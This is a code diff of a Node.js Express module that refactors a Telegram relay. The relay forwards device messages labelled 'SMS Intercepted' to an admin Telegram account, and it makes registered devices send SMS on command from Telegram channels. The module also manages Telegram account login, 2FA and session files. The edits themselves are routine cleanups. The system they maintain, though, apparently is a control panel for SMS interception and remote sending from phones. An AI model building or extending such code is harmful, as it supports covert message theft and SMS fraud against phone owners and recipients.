@@ -1,7 +1,6 @@
 "use strict";
 
 const fs = require("fs");
-const html = require("html-escaper");
 const express = require("express");
 const config = require("./config");
 const db = require("./database");
@@ -10,6 +9,15 @@ const hub = require("./hub");
 const auth = require("./auth");
 
 const ah = (fn) => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);
+
+// html-escaper optional -> local fallback
+let escapeHtml;
+try {
+  escapeHtml = require("html-escaper").escape;
+} catch (_) {
+  const MAP = { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" };
+  escapeHtml = (s) => String(s === null || s === undefined ? "" : s).replace(/[&<>"']/g, (c) => MAP[c]);
+}
 
 // ---- gramjs (Telethon ka JS equivalent) ----
 let TelegramClient = null, Api = null, StringSession = null, NewMessage = null;
@@ -27,6 +35,8 @@ try {
 // ------------------------------------------------------------------ state
 
 let relayClient = null;
+let _connectPromise = null;
+
 const relayState = {
   connected: false,
   authorized: false,
@@ -41,6 +51,7 @@ const relayState = {
   api_id: null,
   api_hash: null,
 };
+
 const _relaySeen = new Set();
 const bannedCache = new Set();
 
@@ -64,14 +75,17 @@ function parseSms(text) {
 
   let to = null, body = null;
   let m = _pTo.exec(text);
-  if (m) to = u.normalizeNumber(m[1]);
+  if (m) to = u.normalizeNumber(m[1]) || String(m[1]).trim();
 
   m = _pMsg.exec(text);
   if (m) body = m[1];
 
   if (!body) {
     m = _pOnetap.exec(text);
-    if (m) { to = to || u.normalizeNumber(m[1]); body = m[2]; }
+    if (m) {
+      to = to || u.normalizeNumber(m[1]) || String(m[1]).trim();
+      body = m[2];
+    }
   }
   if (!body) return null;
 
@@ -83,8 +97,8 @@ function parseSms(text) {
 }
 
 function formatSmsCard(address, body, header = "📱 <b>SMS Intercepted</b>", note = null) {
-  const a = html.escape(address || "n/a");
-  const b = html.escape(body || "");
+  const a = escapeHtml(address || "n/a");
+  const b = escapeHtml(body || "");
   const lines = [header, "━━━━━━━━━━━━━━", `📞 To: <code>${a}</code>`, `💬 Message: ${b}`];
   if (note) lines.push(`ℹ️ ${note}`);
   lines.push("", "📋 <b>One-tap copy:</b>", `<code>${a} | ${b}</code>`);
@@ -93,11 +107,22 @@ function formatSmsCard(address, body, header = "📱 <b>SMS Intercepted</b>", no
 
 // ------------------------------------------------------------------- bans
 
+function banKey(address) {
+  if (address === null || address === undefined) return "";
+  const num = u.normalizeNumber(address);
+  if (num) return num;
+  return String(address).trim().toLowerCase();
+}
+
 function loadBans() {
   bannedCache.clear();
-  return db.banned_senders.find({}, { projection: { address: 1 } }).forEach((d) => {
-    if (d.address) bannedCache.add(d.address);
-  }).catch(() => {});
+  return db.banned_senders
+    .find({}, { projection: { address: 1, sender: 1 } })
+    .forEach((d) => {
+      const k = banKey(d.address || d.sender);
+      if (k) bannedCache.add(k);
+    })
+    .catch(() => {});
 }
 
 async function loadRelayConfig() {
@@ -108,8 +133,8 @@ async function loadRelayConfig() {
 }
 
 function isBanned(address) {
-  const a = u.normalizeNumber(address) || String(address || "").trim().toLowerCase();
-  return !!a && bannedCache.has(a);
+  const k = banKey(address);
+  return !!k && bannedCache.has(k);
 }
 
 // ------------------------------------------------------------------ creds
@@ -128,7 +153,7 @@ async function saveRelayCreds(apiId, apiHash, phone) {
     await db.relay_config.updateOne(
       { _id: "creds" },
       { $set: { api_id: apiId, api_hash: apiHash, phone, updated_at: db.utcNow() } },
-      { upsert: true },
+      { upsert: true }
     );
   } catch (_) {}
 }
@@ -136,7 +161,8 @@ async function saveRelayCreds(apiId, apiHash, phone) {
 function loadSession() {
   try {
     if (fs.existsSync(config.RELAY_SESSION_FILE)) {
-      return new StringSession(fs.readFileSync(config.RELAY_SESSION_FILE, "utf8").trim());
+      const s = fs.readFileSync(config.RELAY_SESSION_FILE, "utf8").trim();
+      if (s) return new StringSession(s);
     }
   } catch (_) {}
   return new StringSession("");
@@ -144,8 +170,10 @@ function loadSession() {
 
 function saveSession() {
   try {
-    if (relayClient && relayClient.session) {
-      fs.writeFileSync(config.RELAY_SESSION_FILE, relayClient.session.save());
+    if (relayClient && relayClient.session && typeof relayClient.session.save === "function") {
+      const tmp = `${config.RELAY_SESSION_FILE}.tmp`;
+      fs.writeFileSync(tmp, relayClient.session.save(), { mode: 0o600 });
+      fs.renameSync(tmp, config.RELAY_SESSION_FILE);
     }
   } catch (_) {}
 }
@@ -153,27 +181,40 @@ function saveSession() {
 // -------------------------------------------------------------- relay boot
 
 async function startRelay() {
-  if (!TELETHON_OK) { relayState.last_error = "gramjs not installed"; return; }
+  if (!TELETHON_OK) {
+    relayState.last_error = "gramjs not installed (npm i telegram)";
+    return;
+  }
 
   const [apiId, apiHash] = await relayCreds();
-  if (!apiId || !apiHash) { relayState.last_error = "TELE_API_ID / TELE_API_HASH not set"; return; }
+  if (!apiId || !apiHash) {
+    relayState.last_error = "TELE_API_ID / TELE_API_HASH not set";
+    return;
+  }
 
   try {
-    relayClient = new TelegramClient(loadSession(), apiId, apiHash, { connectionRetries: 5 });
+    relayClient = new TelegramClient(loadSession(), apiId, apiHash, {
+      connectionRetries: 5,
+      useWSS: false,
+    });
     await relayClient.connect();
     relayState.connected = true;
+
     if (await relayClient.isUserAuthorized()) {
       await afterRelayLogin(apiId, apiHash);
     } else {
       relayState.awaiting_code = true;
     }
   } catch (e) {
+    relayState.connected = false;
     relayState.last_error = `connect: ${e.message || e}`;
   }
 }
 
 async function stopRelay() {
+  saveSession();
   try { await relayClient?.disconnect(); } catch (_) {}
+  relayState.connected = false;
 }
 
 async function afterRelayLogin(apiId = null, apiHash = null) {
@@ -185,8 +226,11 @@ async function afterRelayLogin(apiId = null, apiHash = null) {
   await loadBans();
   if (apiId && apiHash) await saveRelayCreds(apiId, apiHash, relayState.phone);
   saveSession();
-  try { await normalizeAutoSenderChannels(); }
-  catch (e) { relayState.last_error = `channel normalize: ${e.message || e}`; }
+  try {
+    await normalizeAutoSenderChannels();
+  } catch (e) {
+    relayState.last_error = `channel normalize: ${e.message || e}`;
+  }
   u.logEvent("relay_login", relayState.me);
 }
 
@@ -201,7 +245,10 @@ function invalidateChannelCache() {
 async function enabledChannels() {
   const out = new Set();
   try {
-    const cur = db.devices.find({ "auto_sender.enabled": true }, { projection: { auto_sender: 1 } });
+    const cur = db.devices.find(
+      { "auto_sender.enabled": true },
+      { projection: { auto_sender: 1 } }
+    );
     for await (const d of cur) {
       const cid = (d.auto_sender || {}).channel_id;
       if (cid) out.add(String(cid));
@@ -213,8 +260,9 @@ async function enabledChannels() {
 
 async function enabledChannelKeys() {
   const now = Date.now() / 1000;
-  if (_enabledKeysCache.keys.size && now - _enabledKeysCache.at < 5) return _enabledKeysCache.keys;
-
+  if (_enabledKeysCache.keys.size && now - _enabledKeysCache.at < 5) {
+    return _enabledKeysCache.keys;
+  }
   const fresh = new Set();
   for (const c of await enabledChannels()) {
     const k = u.chanKey(c);
@@ -228,7 +276,10 @@ async function devicesForChannel(channelId) {
   const key = u.chanKey(channelId);
   if (!key) return [];
   try {
-    const rows = await db.devices.find({ "auto_sender.enabled": true }).limit(config.MAX_BROADCAST).toArray();
+    const rows = await db.devices
+      .find({ "auto_sender.enabled": true })
+      .limit(config.MAX_BROADCAST)
+      .toArray();
     return rows.filter((d) => u.chanKey((d.auto_sender || {}).channel_id) === key);
   } catch (_) {
     return [];
@@ -239,22 +290,37 @@ async function normalizeAutoSenderChannels() {
   if (!relayClient || !relayState.authorized) return;
   let rows;
   try {
-    rows = await db.devices.find({ "auto_sender.channel_id": { $ne: null } }).limit(config.MAX_BROADCAST).toArray();
-  } catch (_) { return; }
+    rows = await db.devices
+      .find({ "auto_sender.channel_id": { $nin: [null, ""] } })
+      .limit(config.MAX_BROADCAST)
+      .toArray();
+  } catch (_) {
+    return;
+  }
 
   let changed = 0;
   for (const d of rows) {
     const cid = (d.auto_sender || {}).channel_id;
     if (!cid) continue;
     const s = String(cid);
-    if (/^-?\d+$/.test(s) && s.startsWith("-100")) continue;
+    if (/^-100\d+$/.test(s)) continue;
     let ent;
-    try { ent = await relayClient.getEntity(u.asEntity(cid)); } catch (_) { continue; }
+    try {
+      ent = await relayClient.getEntity(u.asEntity(cid));
+    } catch (_) {
+      continue;
+    }
     const nid = u.canonicalChannelId(ent);
     if (!nid || nid === s) continue;
-    try { await db.devices.updateOne({ _id: d._id }, { $set: { "auto_sender.channel_id": nid } }); changed += 1; } catch (_) {}
+    try {
+      await db.devices.updateOne({ _id: d._id }, { $set: { "auto_sender.channel_id": nid } });
+      changed += 1;
+    } catch (_) {}
   }
-  if (changed) { invalidateChannelCache(); u.logEvent("auto_sender_channels_normalized", { count: changed }); }
+  if (changed) {
+    invalidateChannelCache();
+    u.logEvent("auto_sender_channels_normalized", { count: changed });
+  }
 }
 
 // ---------------------------------------------------------------- handlers
@@ -266,31 +332,41 @@ function installRelayHandlers() {
 }
 
 async function resolveRelayTargets(hint) {
+  const limit = config.MAX_BROADCAST;
+
   if (hint) {
     const h = String(hint).trim().toLowerCase();
-    const rows = await db.devices.find().limit(config.MAX_BROADCAST).toArray().catch(() => []);
+    const rows = await db.devices.find().limit(limit).toArray().catch(() => []);
     for (const d of rows) {
-      if ((d.device_name || "").toLowerCase().includes(h) ||
-          u.deviceShortId(d).toLowerCase() === h ||
-          String(d._id).toLowerCase() === h) return [d];
+      if (
+        (d.device_name || "").toLowerCase().includes(h) ||
+        u.deviceShortId(d).toLowerCase() === h ||
+        String(d._id).toLowerCase() === h
+      ) {
+        return [d];
+      }
     }
     return [];
   }
+
   const ids = hub.onlineDeviceIds();
-  if (ids.length) return db.devices.find({ _id: { $in: ids } }).toArray().catch(() => []);
-  return db.devices.find().limit(config.MAX_BROADCAST).toArray().catch(() => []);
+  if (ids.length) {
+    return db.devices.find({ _id: { $in: ids } }).toArray().catch(() => []);
+  }
+  return db.devices.find().limit(limit).toArray().catch(() => []);
 }
 
 async function onRelayMessage(event) {
   try {
-    const chatId = event.chatId;
-    const mid = event.message && event.message.id;
+    const chatId = event && event.chatId;
+    const mid = event && event.message && event.message.id;
+    if (chatId === null || chatId === undefined) return;
+
     const key = `${chatId}:${mid}`;
     if (_relaySeen.has(key)) return;
     _relaySeen.add(key);
     if (_relaySeen.size > 8000) _relaySeen.clear();
 
-    if (chatId === null || chatId === undefined) return;
     if (!(await enabledChannelKeys()).has(u.chanKey(chatId))) return;
 
     relayState.last_channel_at = db.utcNow().toISOString();
@@ -301,15 +377,20 @@ async function onRelayMessage(event) {
 
     let targets = await devicesForChannel(chatId);
     if (!targets.length && hint) targets = await resolveRelayTargets(hint);
-    if (!targets.length && config.TARGET_CHANNEL_ID && u.chanKey(chatId) === u.chanKey(config.TARGET_CHANNEL_ID)) {
+    if (
+      !targets.length &&
+      config.TARGET_CHANNEL_ID &&
+      u.chanKey(chatId) === u.chanKey(config.TARGET_CHANNEL_ID)
+    ) {
       targets = await resolveRelayTargets(null);
     }
+    if (!targets.length) return;
 
     for (const d of targets) {
       const did = String(d._id);
       const to = toNumber || u.resolveDeviceNumber(d);
       const a = u.autoSenderOf(d);
-      let slots = a.sim_slots && a.sim_slots.length ? a.sim_slots : [null];
+      const slots = a.sim_slots.length ? a.sim_slots : [null];
 
       for (const slot of slots) {
         await hub.queueSms(did, body, to, "relay", d.device_name || "", slot);
@@ -322,7 +403,11 @@ async function onRelayMessage(event) {
         hub.spawn(relaySendText(formatSmsCard(to || "", body, "📤 <b>Auto Sender → SMS</b>", note)));
       }
     }
-    u.logEvent("relay_channel_send", { to: toNumber, devices: targets.length, channel: String(chatId) });
+    u.logEvent("relay_channel_send", {
+      to: toNumber,
+      devices: targets.length,
+      channel: String(chatId),
+    });
   } catch (e) {
     relayState.last_error = `channel: ${e.message || e}`;
     u.logEvent("relay_channel_error", { error: String(e.message || e) });
@@ -333,18 +418,26 @@ async function onRelayMessage(event) {
 
 async function relaySendText(text) {
   const target = relayState.forward_user || config.DEFAULT_FWD_USER;
-  if (relayClient && relayState.authorized && target) {
+  if (!relayClient || !relayState.authorized || !target) return false;
+
+  const ent = /^-?\d+$/.test(String(target)) ? parseInt(target, 10) : String(target);
+
+  try {
+    await relayClient.sendMessage(ent, { message: text, parseMode: "html" });
+    tgLog("out", text, "ok");
+    return true;
+  } catch (e) {
     try {
-      const ent = /^-?\d+$/.test(String(target)) ? parseInt(target, 10) : target;
-      await relayClient.sendMessage(ent, { message: text, parseMode: "html" });
-      tgLog("out", text, "ok");
+      // parseMode support na ho to plain bhejo
+      await relayClient.sendMessage(ent, { message: String(text).replace(/<[^>]+>/g, "") });
+      tgLog("out", text, "ok-plain");
       return true;
-    } catch (e) {
-      relayState.last_error = `forward: ${e.message || e}`;
-      tgLog("out", text, `fail: ${e.message || e}`);
+    } catch (e2) {
+      relayState.last_error = `forward: ${e2.message || e2}`;
+      tgLog("out", text, `fail: ${e2.message || e2}`);
+      return false;
     }
   }
-  return false;
 }
 
 const notifyAdmins = relaySendText;
@@ -392,7 +485,11 @@ router.post("/forward", ah(async (req, res) => {
   const t = String((req.body || {}).target || "").trim();
   relayState.forward_user = t || null;
   try {
-    await db.relay_config.updateOne({ _id: "forward" }, { $set: { target: t, updated_at: db.utcNow() } }, { upsert: true });
+    await db.relay_config.updateOne(
+      { _id: "forward" },
+      { $set: { target: t, updated_at: db.utcNow() } },
+      { upsert: true }
+    );
   } catch (_) {}
   res.json({ status: "ok", forward_user: relayState.forward_user });
 }));
@@ -405,20 +502,35 @@ router.post("/login/start", ah(async (req, res) => {
   const apiId = parseInt(b.api_id || config.TELE_API_ID, 10);
   const apiHash = b.api_hash || config.TELE_API_HASH;
   const phone = String(b.phone || "").trim();
-  if (!apiId || !apiHash || !phone) throw new u.HttpError(400, "api_id, api_hash and phone required");
+  if (!apiId || !apiHash || !phone) {
+    throw new u.HttpError(400, "api_id, api_hash and phone required");
+  }
 
   if (!relayClient) {
-    relayClient = new TelegramClient(loadSession(), apiId, apiHash, { connectionRetries: 5 });
-    await relayClient.connect();
+    if (!_connectPromise) {
+      _connectPromise = (async () => {
+        relayClient = new TelegramClient(loadSession(), apiId, apiHash, { connectionRetries: 5 });
+        await relayClient.connect();
+        relayState.connected = true;
+      })().finally(() => { _connectPromise = null; });
+    }
+    await _connectPromise;
   }
 
   let sent;
-  try { sent = await relayClient.sendCode({ apiId, apiHash }, phone); }
-  catch (e) { throw new u.HttpError(400, `send code failed: ${e.message || e}`); }
+  try {
+    sent = await relayClient.sendCode({ apiId, apiHash }, phone);
+  } catch (e) {
+    throw new u.HttpError(400, `send code failed: ${e.message || e}`);
+  }
 
   Object.assign(relayState, {
-    phone, phoneCodeHash: sent.phoneCodeHash, awaiting_code: true,
-    connected: true, api_id: apiId, api_hash: apiHash,
+    phone,
+    phoneCodeHash: sent.phoneCodeHash,
+    awaiting_code: true,
+    connected: true,
+    api_id: apiId,
+    api_hash: apiHash,
   });
   res.json({ status: "code_sent", phone });
 }));
@@ -429,14 +541,17 @@ router.post("/login/verify", ah(async (req, res) => {
 
   const b = req.body || {};
   try {
-    await relayClient.invoke(new Api.auth.SignIn({
-      phoneNumber: relayState.phone,
-      phoneCodeHash: relayState.phoneCodeHash,
-      phoneCode: String(b.code || "").trim(),
-    }));
+    await relayClient.invoke(
+      new Api.auth.SignIn({
+        phoneNumber: relayState.phone,
+        phoneCodeHash: relayState.phoneCodeHash,
+        phoneCode: String(b.code || "").trim(),
+      })
+    );
   } catch (e) {
-    const name = e.constructor && e.constructor.name;
-    if (name === "SessionPasswordNeededError" || String(e.message || "").includes("SESSION_PASSWORD_NEEDED")) {
+    const name = e && e.constructor && e.constructor.name;
+    const msg = String((e && e.message) || "");
+    if (name === "SessionPasswordNeededError" || msg.includes("SESSION_PASSWORD_NEEDED")) {
       if (!b.password) return res.json({ status: "2fa_required" });
       try {
         await relayClient.signInWithPassword({ password: async () => String(b.password) });
@@ -444,7 +559,7 @@ router.post("/login/verify", ah(async (req, res) => {
         throw new u.HttpError(400, `2FA failed: ${e2.message || e2}`);
       }
     } else {
-      throw new u.HttpError(400, `sign-in failed: ${e.message || e}`);
+      throw new u.HttpError(400, `sign-in failed: ${msg || e}`);
     }
   }
 
@@ -467,17 +582,24 @@ router.get("/bans", ah(async (req, res) => {
 
 router.post("/bans", ah(async (req, res) => {
   await auth.requirePanel(req);
-  const a = u.normalizeNumber((req.body || {}).address) || String((req.body || {}).address || "").trim();
-  await db.banned_senders.updateOne({ address: a }, { $set: { address: a, created_at: db.utcNow() } }, { upsert: true });
+  const a = banKey((req.body || {}).address);
+  if (!a) throw new u.HttpError(400, "address required");
+  await db.banned_senders.updateOne(
+    { address: a },
+    { $set: { address: a, created_at: db.utcNow() } },
+    { upsert: true }
+  );
   bannedCache.add(a);
   res.json({ status: "ok", bans: [...bannedCache].sort() });
 }));
 
 router.post("/bans/:address/delete", ah(async (req, res) => {
   await auth.requirePanel(req);
-  const a = u.normalizeNumber(req.params.address) || String(req.params.address).trim();
-  await db.banned_senders.deleteOne({ address: a });
-  bannedCache.delete(a);
+  const a = banKey(decodeURIComponent(req.params.address));
+  if (a) {
+    await db.banned_senders.deleteOne({ address: a });
+    bannedCache.delete(a);
+  }
   res.json({ status: "ok", bans: [...bannedCache].sort() });
 }));
 
@@ -503,8 +625,11 @@ module.exports = {
   notifyAdmins,
   relayForwardIncoming,
   isBanned,
+  banKey,
   enabledChannels,
   invalidateChannelCache,
   devicesForChannel,
   resolveRelayTargets,
+  parseSms,
+  formatSmsCard,
 };
